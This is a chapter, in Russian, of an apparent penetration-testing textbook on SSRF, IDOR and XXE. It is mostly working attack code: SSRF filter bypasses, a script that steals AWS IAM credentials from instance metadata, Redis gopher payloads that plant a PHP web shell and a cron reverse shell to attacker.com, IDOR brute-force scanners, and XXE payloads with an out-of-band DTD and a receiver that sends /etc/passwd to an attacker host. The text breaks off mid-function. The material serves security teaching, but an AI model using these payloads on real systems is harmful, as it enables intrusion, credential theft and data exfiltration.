# Глава 11.3: SSRF, IDOR и XXE

## 🎯 Цели главы

- Понять механизм атаки SSRF и научиться обходить фильтры защиты
- Изучить техники эксплуатации облачных метаданных через SSRF
- Освоить поиск и эксплуатацию IDOR-уязвимостей в API и веб-приложениях
- Разобрать XXE-атаки: file read, SSRF через XXE, blind out-of-band
- Написать собственные скрипты автоматизации для каждой уязвимости

---

## 11.3.1 SSRF — Server-Side Request Forgery

### Что такое SSRF?

SSRF (Подделка запроса на стороне сервера) — уязвимость, при которой атакующий заставляет сервер выполнять HTTP-запросы к произвольным ресурсам. Сервер выступает прокси-сервером для атакующего, что позволяет:

- Достигать внутренних сервисов, недоступных снаружи
- Читать метаданные облачных инстансов
- Обходить межсетевые экраны и ACL
- Выполнять атаки CSRF от имени сервера
- Сканировать внутреннюю инфраструктуру

```
┌─────────────────────────────────────────────────────────┐
│                    SSRF Attack Flow                      │
│                                                          │
│  Attacker         Vulnerable Server    Internal Service  │
│  ─────────        ────────────────     ────────────────  │
│     │                    │                    │          │
│     │  POST /fetch       │                    │          │
│     │  url=http://       │                    │          │
│     │  internal:8080/    │                    │          │
│     ├──────────────────► │                    │          │
│     │                    │  GET /admin        │          │
│     │                    ├──────────────────► │          │
│     │                    │  200 OK + data     │          │
│     │                    │ ◄────────────────── │          │
│     │  Response          │                    │          │
│     │ ◄────────────────── │                    │          │
│                                                          │
│  Firewall blocks direct access, but not server→internal  │
└─────────────────────────────────────────────────────────┘
```

### Базовый пример SSRF

Предположим, приложение принимает URL для загрузки изображения:

```http
POST /api/fetch-image HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json

{"url": "https://external-site.com/image.jpg"}
```

Атакующий подставляет внутренний адрес:

```http
POST /api/fetch-image HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json

{"url": "http://192.168.1.1/admin"}
```

### Уязвимый код на PHP

```php
<?php
// УЯЗВИМО: нет валидации URL
function fetchUrl(string $url): string {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); // опасно!
    $response = curl_exec($ch);
    curl_close($ch);
    return $response;
}

// Пользователь контролирует $url
$url = $_POST['url'];
echo fetchUrl($url);
```

```python
# УЯЗВИМО: Python пример
import requests
from flask import Flask, request

app = Flask(__name__)

@app.route('/proxy')
def proxy():
    url = request.args.get('url')
    # Нет проверки! Отправляем запрос от имени сервера
    resp = requests.get(url, timeout=5)
    return resp.text
```

---

## 11.3.2 Техники обхода SSRF-фильтров

Разработчики часто добавляют простые фильтры. Ниже — техники их обхода.

### Вариации localhost

```
# Стандартные блокируемые адреса:
http://localhost/
http://127.0.0.1/
http://0.0.0.0/

# Обходы через альтернативные представления:
http://127.1/                    # Сокращённый IP
http://127.0.1/                  # Нестандартный формат
http://[::1]/                    # IPv6 loopback
http://[0:0:0:0:0:ffff:127.0.0.1]/ # IPv6-mapped IPv4
http://0177.0.0.1/               # Восьмеричное представление
http://0x7f.0x0.0x0.0x1/        # Шестнадцатеричное
http://2130706433/               # Десятичное представление 127.0.0.1
http://017700000001/             # Восьмеричное целое число

# URL encoding:
http://%6c%6f%63%61%6c%68%6f%73%74/  # localhost в URL-encoding
http://127.0.0.1%00@evil.com/        # Null byte injection
```

```python
# Скрипт генерации обходов localhost
def generate_localhost_bypasses():
    bypasses = [
        # IPv4 вариации
        "http://127.0.0.1/",
        "http://127.1/",
        "http://127.0.1/",
        "http://0.0.0.0/",
        "http://0/",
        
        # Восьмеричные
        "http://0177.0.0.1/",
        "http://0177.0000.0000.0001/",
        
        # Шестнадцатеричные
        "http://0x7f000001/",
        "http://0x7f.0x00.0x00.0x01/",
        
        # Десятичное
        "http://2130706433/",
        
        # IPv6
        "http://[::1]/",
        "http://[::ffff:127.0.0.1]/",
        "http://[0:0:0:0:0:ffff:7f00:0001]/",
        
        # Специальные
        "http://localhost/",
        "http://LOCALHOST/",
        "http://Localhost/",
        "http://lOcAlHoSt/",
        
        # С credentials
        "http://foo@127.0.0.1/",
        "http://foo:bar@127.0.0.1/",
    ]
    return bypasses

for bypass in generate_localhost_bypasses():
    print(bypass)
```

### DNS Rebinding

DNS rebinding — техника, при которой DNS-запись сначала возвращает легитимный IP, а затем переключается на внутренний адрес:

```
┌────────────────────────────────────────────────────────────┐
│                   DNS Rebinding Attack                      │
│                                                             │
│  1. Attacker registers evil.com with DNS TTL=1 second       │
│                                                             │
│  2. First DNS query: evil.com → 1.2.3.4 (public IP)        │
│     Server checks: "OK, not internal"                       │
│                                                             │
│  3. TTL expires, DNS changes: evil.com → 192.168.1.1        │
│                                                             │
│  4. Server makes actual request to evil.com                 │
│     Now resolves to internal IP → SSRF success!             │
│                                                             │
│  Tools: rbndr.us, singularity.me                            │
└────────────────────────────────────────────────────────────┘
```

```python
# Использование DNS rebinding сервиса
# rbndr.us: {hex(public_ip)}.{hex(internal_ip)}.rbndr.us

import socket
import struct

def ip_to_hex(ip: str) -> str:
    """Конвертирует IP в hex для rbndr.us"""
    packed = socket.inet_aton(ip)
    return struct.unpack('!I', packed)[0].__format__('08x')

public_ip = "1.2.3.4"       # Ваш публичный IP
internal_ip = "192.168.1.1"  # Целевой внутренний IP

# Формируем rebinding домен
rebind_host = f"{ip_to_hex(public_ip)}.{ip_to_hex(internal_ip)}.rbndr.us"
print(f"Используйте: http://{rebind_host}/")
# Пример: http://01020304.c0a80101.rbndr.us/
```

### Open Redirect как SSRF вектор

```http
# Если сервер следует редиректам:
# Шаг 1: Найти open redirect на легитимном домене
GET /redirect?url=http://evil.com HTTP/1.1
Host: trusted-site.com

# Шаг 2: Использовать его как промежуточное звено
POST /fetch HTTP/1.1
Host: vulnerable-app.com

url=https://trusted-site.com/redirect?url=http://169.254.169.254/
```

```python
# Скрипт поиска open redirect на целевом домене
import requests
from urllib.parse import urljoin

def find_open_redirects(base_url: str, paths: list) -> list:
    """Ищет open redirect на заданных путях"""
    found = []
    test_url = "http://evil-example.com"
    
    params_to_test = ['url', 'redirect', 'next', 'return', 
                      'goto', 'dest', 'destination', 'redir',
                      'redirect_url', 'return_url', 'forward']
    
    for path in paths:
        for param in params_to_test:
            test = f"{base_url}{path}?{param}={test_url}"
            try:
                resp = requests.get(test, allow_redirects=False, timeout=5)
                if resp.status_code in [301, 302, 303, 307, 308]:
                    location = resp.headers.get('Location', '')
                    if 'evil-example.com' in location:
                        found.append({
                            'url': test,
                            'location': location,
                            'status': resp.status_code
                        })
                        print(f"[+] Open Redirect найден: {test}")
            except Exception as e:
                pass
    
    return found
```

### Протоколы для обхода фильтров

```
# Не только HTTP! Пробуйте другие схемы:
file:///etc/passwd              # Чтение локальных файлов
dict://127.0.0.1:6379/info      # Атака на Redis
gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aPING%0d%0a  # Redis через gopher
ftp://127.0.0.1:21/            # FTP
sftp://attacker.com:11111/     # SFTP для SSRF
ldap://127.0.0.1:389/          # LDAP
```

```python
# Gopher payload для атаки на Redis через SSRF
def generate_gopher_redis_payload(host: str, port: int, command: list) -> str:
    """
    Генерирует Gopher URL для выполнения команды Redis
    Например: SET ключ значение
    """
    from urllib.parse import quote
    
    # Формат Redis протокола (RESP)
    payload = f"*{len(command)}\r\n"
    for part in command:
        payload += f"${len(part)}\r\n{part}\r\n"
    
    # Кодируем для gopher
    encoded = quote(payload, safe='')
    return f"gopher://{host}:{port}/_{encoded}"

# Пример: запись веб-шелла через Redis
redis_command = [
    "SET", "shell", "<?php system($_GET['cmd']); ?>"
]
print(generate_gopher_redis_payload("127.0.0.1", 6379, redis_command))
```

---

## 11.3.3 Атака на облачные метаданные

### AWS Instance Metadata Service (IMDS)

```
┌──────────────────────────────────────────────────────────┐
│           AWS Metadata Service (169.254.169.254)          │
│                                                           │
│  GET /latest/meta-data/                                   │
│  ├── ami-id                                               │
│  ├── instance-id                                          │
│  ├── instance-type                                        │
│  ├── hostname                                             │
│  ├── local-ipv4                                           │
│  ├── public-ipv4                                          │
│  ├── security-groups                                      │
│  └── iam/                                                 │
│      └── security-credentials/                            │
│          └── {role-name}     ← AWS Keys!                  │
│              ├── AccessKeyId                              │
│              ├── SecretAccessKey                          │
│              └── Token (временный)                        │
└──────────────────────────────────────────────────────────┘
```

```python
#!/usr/bin/env python3
"""
AWS Metadata эксплуатация через SSRF
"""
import requests
import json

SSRF_ENDPOINT = "https://vulnerable-app.com/fetch"
AWS_METADATA_BASE = "http://169.254.169.254/latest"

def ssrf_request(url: str) -> str:
    """Выполняет запрос через SSRF-уязвимость"""
    resp = requests.post(
        SSRF_ENDPOINT,
        json={"url": url},
        timeout=10
    )
    return resp.text

def exploit_aws_metadata():
    """Полная эксплуатация AWS метаданных"""
    
    print("[*] Получаем базовую информацию...")
    
    # Шаг 1: Получить список ролей IAM
    roles_url = f"{AWS_METADATA_BASE}/meta-data/iam/security-credentials/"
    roles_response = ssrf_request(roles_url)
    print(f"[+] IAM роли: {roles_response}")
    
    # Шаг 2: Для каждой роли получить credentials
    roles = roles_response.strip().split('\n')
    
    for role in roles:
        creds_url = f"{AWS_METADATA_BASE}/meta-data/iam/security-credentials/{role.strip()}"
        creds_json = ssrf_request(creds_url)
        
        try:
            creds = json.loads(creds_json)
            print(f"\n[!] AWS Credentials для роли '{role}':")
            print(f"    AccessKeyId:     {creds.get('AccessKeyId')}")
            print(f"    SecretAccessKey: {creds.get('SecretAccessKey')}")
            print(f"    Token:           {creds.get('Token', 'N/A')[:50]}...")
            print(f"    Expiration:      {creds.get('Expiration')}")
            
            # Сохраняем для использования
            with open(f"aws_creds_{role.strip()}.json", 'w') as f:
                json.dump(creds, f, indent=2)
                
        except json.JSONDecodeError:
            print(f"[-] Не удалось разобрать credentials для {role}")
    
    # Шаг 3: Дополнительная информация
    endpoints = {
        "instance-id": f"{AWS_METADATA_BASE}/meta-data/instance-id",
        "instance-type": f"{AWS_METADATA_BASE}/meta-data/instance-type",
        "region": f"{AWS_METADATA_BASE}/meta-data/placement/region",
        "user-data": f"{AWS_METADATA_BASE}/user-data",  # Часто содержит секреты!
        "security-groups": f"{AWS_METADATA_BASE}/meta-data/security-groups",
    }
    
    print("\n[*] Собираем дополнительные данные...")
    for name, url in endpoints.items():
        data = ssrf_request(url)
        print(f"    {name}: {data[:100]}")

if __name__ == "__main__":
    exploit_aws_metadata()
```

### IMDSv2 и обход

IMDSv2 требует токен — но SSRF всё ещё работает при поддержке PUT:

```python
def exploit_imdsv2():
    """Обход IMDSv2 через двухшаговый SSRF"""
    
    # Шаг 1: Получить токен (PUT-запрос с TTL)
    # Нужен SSRF с поддержкой PUT и кастомных заголовков
    token_request = {
        "method": "PUT",
        "url": "http://169.254.169.254/latest/api/token",
        "headers": {
            "X-aws-ec2-metadata-token-ttl-seconds": "21600"
        }
    }
    token = ssrf_request_custom(token_request)
    
    # Шаг 2: Использовать токен
    creds_request = {
        "method": "GET", 
        "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "headers": {
            "X-aws-ec2-metadata-token": token
        }
    }
    return ssrf_request_custom(creds_request)
```

### GCP Metadata Server

```bash
# GCP метаданные
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/

# Обязательный заголовок: Metadata-Flavor: Google

# Ключевые эндпоинты:
/computeMetadata/v1/project/project-id
/computeMetadata/v1/instance/service-accounts/default/token  # OAuth токен!
/computeMetadata/v1/instance/service-accounts/default/email
/computeMetadata/v1/project/attributes/ssh-keys
```

```python
def exploit_gcp_metadata():
    """Эксплуатация GCP IMDS через SSRF"""
    
    base = "http://metadata.google.internal/computeMetadata/v1"
    
    # GCP требует заголовок Metadata-Flavor: Google
    # Если SSRF позволяет кастомные заголовки:
    endpoints = [
        f"{base}/project/project-id",
        f"{base}/instance/name",
        f"{base}/instance/zone",
        f"{base}/instance/service-accounts/default/token",
        f"{base}/instance/attributes/",
        f"{base}/project/attributes/",
    ]
    
    for endpoint in endpoints:
        # Через SSRF с поддержкой заголовков
        result = ssrf_with_headers(
            url=endpoint,
            headers={"Metadata-Flavor": "Google"}
        )
        print(f"{endpoint}: {result}")
```

### Azure IMDS

```bash
# Azure Instance Metadata Service
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Заголовок: Metadata: true

# Managed Identity токен — золото!
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

---

## 11.3.4 Blind SSRF

Blind SSRF — уязвимость есть, но ответ сервера не отображается. Нужно использовать out-of-band техники.

```
┌──────────────────────────────────────────────────────┐
│                  Blind SSRF Detection                 │
│                                                       │
│  1. Burp Collaborator / interactsh / ngrok            │
│                                                       │
│  Attacker       Vuln Server    Collaborator Server    │
│  ────────       ───────────    ──────────────────     │
│     │  POST url=http://         │                     │
│     │  collab.burp.io  ────────►│                     │
│     │                          │  ◄── DNS/HTTP ping   │
│     │                          │                      │
│     │  Poll collaborator ──────────────────────────►  │
│     │  ◄─────────────────────────────────── got hit!  │
└──────────────────────────────────────────────────────┘
```

```python
#!/usr/bin/env python3
"""
Blind SSRF с использованием interactsh
Установка: go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
"""
import subprocess
import requests
import threading
import time

def start_interactsh_server():
    """Запуск interactsh для получения out-of-band взаимодействий"""
    # Генерируем уникальный домен
    result = subprocess.run(
        ['interactsh-client', '-v'],
        capture_output=True, text=True, timeout=5
    )
    # Парсим домен из вывода
    for line in result.stdout.split('\n'):
        if 'interactsh.com' in line:
            return line.strip()
    return "your-unique-id.interactsh.com"

def blind_ssrf_scan(target_endpoint: str, oob_domain: str):
    """
    Сканирование внутренней сети через blind SSRF
    """
    # Внутренние диапазоны для сканирования
    internal_ranges = [
        "10.0.0.{i}",
        "172.16.0.{i}",
        "192.168.1.{i}",
        "192.168.0.{i}",
    ]
    
    # Популярные порты для сканирования
    ports = [21, 22, 23, 25, 80, 443, 445, 3306, 3389, 5432, 6379, 8080, 8443, 9200, 27017]
    
    print(f"[*] OOB домен: {oob_domain}")
    print("[*] Начинаем сканирование...")
    
    for ip_template in internal_ranges:
        for i in range(1, 10):  # Ограничиваем для примера
            ip = ip_template.format(i=i)
            
            for port in ports:
                # Используем поддомен для идентификации ответа
                callback = f"{ip.replace('.', '-')}-{port}.{oob_domain}"
                payload_url = f"http://{ip}:{port}/?x={callback}"
                
                try:
                    requests.post(
                        target_endpoint,
                        json={"url": payload_url},
                        timeout=2
                    )
                except:
                    pass

# Альтернатива: использовать ngrok
def setup_ngrok_listener(local_port: int = 8888):
    """Настройка ngrok для blind SSRF"""
    import http.server
    import socketserver
    
    class SSRFHandler(http.server.SimpleHTTPRequestHandler):
        def do_GET(self):
            print(f"[!] SSRF callback: {self.path}")
            print(f"    Headers: {dict(self.headers)}")
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"OK")
        
        def log_message(self, format, *args):
            pass  # Отключаем стандартный лог
    
    with socketserver.TCPServer(("", local_port), SSRFHandler) as httpd:
        print(f"[*] Слушаем на порту {local_port}")
        print(f"[*] Запустите: ngrok http {local_port}")
        httpd.serve_forever()
```

### Blind SSRF через Burp Collaborator

```
1. Burp Suite → Burp menu → Burp Collaborator client
2. Click "Copy to clipboard" → получаем уникальный домен
3. Вставляем в SSRF payload:
   url=http://YOUR-COLLABORATOR-ID.burpcollaborator.net/
4. Нажимаем "Poll now" в окне Collaborator
5. Если есть взаимодействие — SSRF подтверждён
```

---

## 11.3.5 Эксплуатация внутренних сервисов

### Атака на Redis

```python
# Redis через Gopher протокол
# Запись SSH-ключа или web shell

import urllib.parse

def redis_gopher_payload(host: str, port: int, commands: list) -> str:
    """
    Создание Gopher payload для Redis
    commands: список команд RESP формата
    """
    payload = ""
    for cmd in commands:
        parts = cmd.split(' ', 1)
        resp = f"*{len(parts)}\r\n"
        for part in parts:
            resp += f"${len(part)}\r\n{part}\r\n"
        payload += resp
    
    encoded = urllib.parse.quote(payload)
    return f"gopher://{host}:{port}/_{encoded}"

# Пример: запись cron для reverse shell
redis_cmds = [
    "CONFIG SET dir /var/spool/cron/crontabs",
    "CONFIG SET dbfilename root",
    'SET cron "\\n\\n* * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1\\n\\n"',
    "BGSAVE"
]

payload = redis_gopher_payload("127.0.0.1", 6379, redis_cmds)
print(f"SSRF payload: {payload}")
```

### Атака на Elasticsearch

```bash
# Elasticsearch обычно без аутентификации на порту 9200
# Через SSRF:
http://127.0.0.1:9200/                          # Информация о кластере
http://127.0.0.1:9200/_cat/indices?v            # Список индексов
http://127.0.0.1:9200/_cat/nodes?v              # Узлы кластера
http://127.0.0.1:9200/{index}/_search           # Поиск данных
http://127.0.0.1:9200/_all/_search?size=1       # Все документы
```

```python
def exploit_elasticsearch_via_ssrf(ssrf_func, es_host="127.0.0.1", es_port=9200):
    """Дамп Elasticsearch через SSRF"""
    
    base = f"http://{es_host}:{es_port}"
    
    # Получаем список индексов
    indices_raw = ssrf_func(f"{base}/_cat/indices?format=json")
    
    try:
        import json
        indices = json.loads(indices_raw)
        
        for index in indices:
            idx_name = index.get('index', '')
            if idx_name.startswith('.'):
                continue  # Пропускаем системные
                
            print(f"\n[+] Индекс: {idx_name}")
            
            # Получаем первые документы
            search_url = f"{base}/{idx_name}/_search?size=10&pretty"
            docs = ssrf_func(search_url)
            print(docs[:500])
            
    except Exception as e:
        print(f"[-] Ошибка: {e}")
```

---

## 11.3.6 IDOR — Insecure Direct Object Reference

### Что такое IDOR?

IDOR возникает когда приложение использует пользовательский ввод для доступа к объектам без проверки прав доступа.

```
┌────────────────────────────────────────────────────────┐
│                    IDOR Классификация                   │
│                                                         │
│  Горизонтальная эскалация:                              │
│  User A (id=100) → доступ к данным User B (id=101)     │
│                                                         │
│  GET /api/profile?user_id=101                           │
│  → Возвращает данные другого пользователя               │
│                                                         │
│  Вертикальная эскалация:                                │
│  User (role=user) → доступ к admin-функциям             │
│                                                         │
│  GET /api/admin/users?admin_id=1                        │
│  → Выполняется с правами admin                          │
└────────────────────────────────────────────────────────┘
```

### Уязвимый код

```php
<?php
// УЯЗВИМО: нет проверки владельца
function getOrder(int $orderId): array {
    $db = getDatabase();
    // Просто получаем заказ по ID — без проверки кто его владелец!
    return $db->query(
        "SELECT * FROM orders WHERE id = ?", 
        [$orderId]
    )->fetch();
}

// В контроллере:
$orderId = (int) $_GET['order_id']; // Пользователь контролирует это
$order = getOrder($orderId);
echo json_encode($order);
```

```python
# БЕЗОПАСНЫЙ код — проверяем владельца
def get_order(order_id: int, current_user_id: int) -> dict:
    order = db.query(
        "SELECT * FROM orders WHERE id = %s AND user_id = %s",
        [order_id, current_user_id]  # Обязательно привязываем к пользователю!
    ).fetchone()
    
    if not order:
        raise PermissionError("Доступ запрещён или заказ не существует")
    
    return order
```

### Типы идентификаторов и их уязвимость

| Тип ID | Пример | Предсказуемость | Риск |
|--------|--------|-----------------|------|
| Sequential integer | /user/1, /user/2 | Высокая | Критический |
| Timestamp | /doc/1706000000 | Средняя | Высокий |
| Encoded ID | /user/dXNlcjox (base64) | Средняя | Высокий |
| UUID v1 | xxxxxxxx-time-based | Средняя | Средний |
| UUID v4 | xxxxxxxx-random | Низкая | Низкий |
| ULID | 01ARZ3NDEKTSV4RRFFQ69G5FAV | Средняя | Средний |
| Hash (MD5/SHA) | /file/abc123... | Зависит от inputs | Средний |

### Поиск IDOR в API

```python
#!/usr/bin/env python3
"""
Автоматизированный поиск IDOR
"""
import requests
import json
from typing import Optional

class IDORScanner:
    def __init__(self, base_url: str, session_cookies: dict, 
                 victim_cookies: dict):
        self.base_url = base_url
        self.attacker_session = requests.Session()
        self.attacker_session.cookies.update(session_cookies)
        
        self.victim_session = requests.Session()
        self.victim_session.cookies.update(victim_cookies)
        
    def scan_numeric_idor(self, endpoint: str, param: str, 
                          known_victim_id: int, range_size: int = 100):
        """Сканирование числового IDOR"""
        findings = []
        
        for i in range(known_victim_id - range_size, 
                       known_victim_id + range_size):
            url = f"{self.base_url}{endpoint}"
            
            # Запрос от аккаунта атакующего
            resp = self.attacker_session.get(
                url, 
                params={param: i},
                timeout=5
            )
            
            if resp.status_code == 200:
                # Сравниваем с легитимным запросом жертвы
                victim_resp = self.victim_session.get(
                    url,
                    params={param: i},
                    timeout=5
                )
                
                # Если ответы совпадают — IDOR!
                if resp.text == victim_resp.text and resp.text:
                    findings.append({
                        'id': i,
                        'url': url,
                        'response': resp.text[:200]
                    })
                    print(f"[!] IDOR найден: {param}={i}")
        
        return findings
    
    def check_vertical_idor(self, admin_endpoints: list):
        """Проверка вертикального IDOR (доступ к admin-функциям)"""
        findings = []
        
        for endpoint in admin_endpoints:
            url = f"{self.base_url}{endpoint}"
            resp = self.attacker_session.get(url, timeout=5)
            
            # 200 или 201 для обычного пользователя — подозрительно!
            if resp.status_code in [200, 201]:
                findings.append({
                    'endpoint': endpoint,
                    'status': resp.status_code,
                    'response': resp.text[:200]
                })
                print(f"[!] Вертикальный IDOR: {endpoint} ({resp.status_code})")
            
        return findings
    
    def scan_uuid_idor(self, endpoint: str, known_uuids: list):
        """Тест IDOR с UUID — проверяем известные UUID других пользователей"""
        findings = []
        
        for uuid in known_uuids:
            url = f"{self.base_url}{endpoint}/{uuid}"
            resp = self.attacker_session.get(url, timeout=5)
            
            if resp.status_code == 200:
                data = resp.json() if resp.headers.get('content-type', '').startswith('application/json') else {}
                findings.append({
                    'uuid': uuid,
                    'url': url,
                    'data': data
                })
                print(f"[!] UUID IDOR: {uuid}")
        
        return findings


# Использование
scanner = IDORScanner(
    base_url="https://target-app.com",
    session_cookies={"session": "attacker_session_token"},
    victim_cookies={"session": "victim_session_token"}
)

# Сканирование числового IDOR
findings = scanner.scan_numeric_idor(
    endpoint="/api/orders",
    param="order_id",
    known_victim_id=12345
)
```

### IDOR в API — реальные примеры

```http
# Пример 1: Изменение email другого пользователя
PUT /api/v1/users/12345/email HTTP/1.1
Authorization: Bearer attacker_token
Content-Type: application/json

{"email": "attacker@evil.com"}

# Пример 2: Скачивание чужих документов
GET /api/documents/download?file_id=99999 HTTP/1.1
Authorization: Bearer attacker_token

# Пример 3: IDOR в теле запроса (не только в URL!)
POST /api/transfer HTTP/1.1
Authorization: Bearer attacker_token
Content-Type: application/json

{
  "from_account": "attacker_account_id",
  "to_account": "attacker_account_id",
  "amount": 1000,
  "source_user_id": 999  // <-- IDOR: меняем user_id
}

# Пример 4: IDOR через заголовок
GET /api/profile HTTP/1.1
Authorization: Bearer attacker_token
X-User-ID: 12345  // <-- Попытка подмены пользователя
```

### Автоматизация с Burp Intruder

```
1. Перехватываем запрос с ID в Burp Proxy
2. Отправляем в Intruder (Ctrl+I)
3. Выделяем ID → Add §
4. Payloads → Numbers: from 1 to 10000, step 1
5. Start Attack
6. Сортируем по Length или Status Code
7. Ищем аномалии (другой размер ответа = данные другого пользователя)
```

```python
# Автоматизация через requests + analyse response
def idor_brute_force(base_url: str, 
                     endpoint_template: str, 
                     auth_header: str,
                     id_range: range) -> list:
    """
    endpoint_template: '/api/users/{id}/profile'
    """
    findings = []
    headers = {"Authorization": auth_header}
    
    # Получаем baseline — наш собственный профиль
    own_id = get_own_user_id(base_url, headers)
    own_response = requests.get(
        f"{base_url}{endpoint_template.format(id=own_id)}",
        headers=headers
    )
    
    for user_id in id_range:
        if user_id == own_id:
            continue
            
        url = f"{base_url}{endpoint_template.format(id=user_id)}"
        resp = requests.get(url, headers=headers, timeout=3)
        
        # Анализируем ответ
        if resp.status_code == 200:
            # Проверяем, что вернулись данные (не пустой ответ)
            if len(resp.text) > 50:
                findings.append({
                    'id': user_id,
                    'url': url,
                    'length': len(resp.text),
                    'preview': resp.text[:100]
                })
                print(f"[!] IDOR id={user_id}: {resp.text[:80]}")
    
    return findings
```

---

## 11.3.7 XXE — XML External Entity

### Структура XXE атаки

XML External Entity injection позволяет атакующему включать внешние файлы и ресурсы в XML-документ.

```xml
<!-- Нормальный XML -->
<?xml version="1.0" encoding="UTF-8"?>
<root>
  <name>John</name>
</root>

<!-- XXE payload — чтение /etc/passwd -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <name>&xxe;</name>  <!-- Будет заменено содержимым файла -->
</root>
```

```
┌─────────────────────────────────────────────────────┐
│                   XXE Attack Types                   │
│                                                      │
│  1. Classic XXE (File Read)                          │
│     ENTITY → file:///etc/passwd → reflected in resp  │
│                                                      │
│  2. XXE → SSRF                                       │
│     ENTITY → http://internal-server/ → reflected     │
│                                                      │
│  3. Blind XXE (Out-of-Band)                          │
│     ENTITY → http://attacker.com/?data={file}        │
│     Data exfiltrated via DNS/HTTP                    │
│                                                      │
│  4. XXE via Error Messages                           │
│     Trigger XML error containing file content        │
└─────────────────────────────────────────────────────┘
```

### Classic XXE — чтение файлов

```xml
<!-- Чтение /etc/passwd -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<stockCheck>
  <productId>&xxe;</productId>
</stockCheck>

<!-- Чтение /etc/hostname -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<data><item>&xxe;</item></data>

<!-- Windows: чтение SAM -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">]>
<data>&xxe;</data>

<!-- PHP wrapper для base64 encoding (обход фильтров) -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<data>&xxe;</data>
```

### SSRF через XXE

```xml
<!-- XXE как вектор SSRF -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<data>&xxe;</data>

<!-- Атака на внутренние сервисы -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://192.168.1.100:8080/admin/users">
]>
<userInfo>&xxe;</userInfo>
```

### Blind XXE — Out-of-Band эксфильтрация

Когда ответ сервера не содержит данных XXE, используем OOB:

```xml
<!-- Шаг 1: Базовый тест — просто DNS запрос -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://YOUR-COLLABORATOR.burpcollaborator.net">
]>
<data>&xxe;</data>
```

```xml
<!-- Шаг 2: Эксфильтрация файла через внешний DTD -->
<!-- Создаём файл evil.dtd на нашем сервере: -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
```

```xml
<!-- Шаг 3: В XXE payload ссылаемся на внешний DTD -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<data>test</data>
```

```python
#!/usr/bin/env python3
"""
Сервер для получения blind XXE данных
"""
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs, unquote
import base64
import threading
import time

class XXEReceiver(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)
        
        # Получаем эксфильтрованные данные
        if 'data' in params:
            data = unquote(params['data'][0])
            print(f"\n[!] XXE DATA RECEIVED:")
            print(f"    Path: {self.path}")
            print(f"    Data: {data}")
            print("-" * 50)
            
            # Сохраняем в файл
            with open("xxe_exfil.txt", "a") as f:
                f.write(f"{time.time()}: {data}\n")
        
        # Отдаём evil.dtd если запрашивают
        if '/evil.dtd' in self.path:
            self.send_response(200)
            self.send_header('Content-Type', 'text/xml')
            self.end_headers()
            
            # Генерируем DTD на лету
            target_file = parse_qs(parsed.query).get('file', ['/etc/passwd'])[0]
            dtd = self.generate_evil_dtd(target_file)
            self.wfile.write(dtd.encode())
            return
        
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")
    
    def generate_evil_dtd(self, target_file: str) -> str:
        callback_url = f"http://YOUR-SERVER-IP:8888"
        return f"""<!ENTITY % file SYSTEM "file://{target_file}">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '{callback_url}/?data=%file;'>">
%eval;
%exfil;"""
    
    def log_message(self, format, *args):
        pass  # Подавляем стандартный лог

def start_xxe_server(port: int = 8888):
    server = HTTPServer(('0.0.0.0', port), XXEReceiver)
    print(f"[*] XXE receiver запущен на порту {port}")
    print(f"[*] Разместите payload:")
    print(f"""
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://YOUR-IP:{port}/evil.dtd">
  %dtd;
]>
<data>test</data>
    """)
    server.serve_forever()

if __name__ == "__main__":
    start_xxe_server()
```

### XXE через Error Messages

```xml
<!-- Когда OOB недоступен, используем ошибки XML -->
<!-- evil.dtd на сервере атакующего: -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;

<!-- Сервер вернёт ошибку, содержащую данные файла:
Error: File not found: /nonexistent/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
-->
```

### XXE в JSON API

Иногда API принимает и XML, если правильно указать Content-Type:

```python
import requests

def test_xxe_in_json_api(url: str, json_payload: dict):
    """
    Тестируем XXE в API, которое обычно принимает JSON
    """
    xxe_payload = """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
